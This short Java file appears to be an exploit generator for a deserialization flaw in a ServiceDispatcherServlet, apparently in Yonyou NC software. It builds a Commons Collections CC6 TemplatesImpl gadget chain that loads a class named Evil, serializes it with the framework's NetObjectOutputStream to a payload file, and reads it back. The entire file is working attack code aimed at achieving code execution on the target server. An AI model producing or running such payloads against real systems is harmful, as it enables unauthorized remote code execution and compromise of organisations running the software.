package exp;
import nc.bs.framework.comn.NetObjectInputStream;
import nc.bs.framework.comn.NetObjectOutputStream;
import payload.CommonCollections;
import tools.Evil;

import java.io.*;

public class ServiceDispatcherServlet {
    public static void main(String[] args) throws Exception{
        Object exp = new CommonCollections().CC6_TemplatesImpl(Evil.class.getName());

        NetObjectOutputStream.writeObject(new FileOutputStream("./ServiceDispatcherServlet"),exp);
        NetObjectInputStream.readObject(new FileInputStream("./ServiceDispatcherServlet"),new boolean[]{true,true});
    }
}
